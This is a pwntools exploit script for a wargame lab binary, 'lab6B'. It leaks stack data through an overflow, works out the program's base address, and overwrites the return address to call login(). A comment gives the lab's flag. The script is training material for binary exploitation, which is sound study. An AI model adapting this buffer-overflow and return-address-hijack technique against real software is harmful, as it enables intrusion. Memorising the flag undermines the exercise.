#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337
# Flag : strncpy_1s_n0t_s0_s4f3_l0l

settings = {

    # Path to binary
    "binary"        : "./lab6B",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    payload = "A" * 0x20
    p.sendlineafter("Enter your username: ", payload)

    payload = xor("A" * 0x20, "\x99")
    p.sendlineafter("Enter your password: ", payload)

    p.recvuntil("Authentication failed for user ")

    # Analyze leaks
    leak = p.recvline()
    username = leak[:0x20]
    hashed_password = leak[0x20:0x40]
    result_val = u32(leak[0x40:0x44])
    attempts = u32(leak[0x44:0x48])
    garbage = u64(leak[0x48:0x50])
    old_ebp = u32(leak[0x50:0x54])
    ret = u32(leak[0x54:0x58])

    # Find login()
    base = (ret ^ 0x99999999) & 0xfffff000
    login = base + 0xaf4

    # Second pass
    payload = "A" * 0x20
    p.sendlineafter("Enter your username: ", payload)

    payload = ""
    payload += xor("A" * 4, "\x99") # result = 0xffffffff
    payload += xor("A" * 4, "\x97\x99\x99\x99") # attempts = 0xffffffff
    payload += xor("A" * 4, "\x97\x99\x99\x99") # attempts = 0xffffffff
    payload += xor("A" * 8, "\x99") # garbage
    payload += xor("A" * 4, p32(ret ^ login))              # RET
    payload = payload.ljust(0x20, "B")
    p.sendlineafter("Enter your password: ", payload)

    p.recvuntil("Authentication failed for user ")
    p.sendline("")
    p.sendline("")
    p.clean()

    p.interactive()


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
